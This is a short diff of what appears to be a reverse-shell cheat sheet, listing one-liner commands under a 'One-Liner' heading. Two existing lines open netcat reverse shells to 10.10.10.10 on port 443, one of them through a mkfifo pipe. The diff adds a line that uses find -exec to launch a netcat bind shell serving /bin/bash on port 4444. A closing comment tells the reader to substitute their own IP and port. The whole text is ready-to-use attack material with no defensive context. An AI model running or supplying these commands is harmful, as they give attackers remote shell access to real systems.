@@ -110,6 +110,7 @@ One-Liner
 
 nc -e /bin/sh 10.10.10.10 443
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f 
+find /home -exec nc -lvp 4444 -e /bin/bash \;
 
 // Replace IP & Port
 
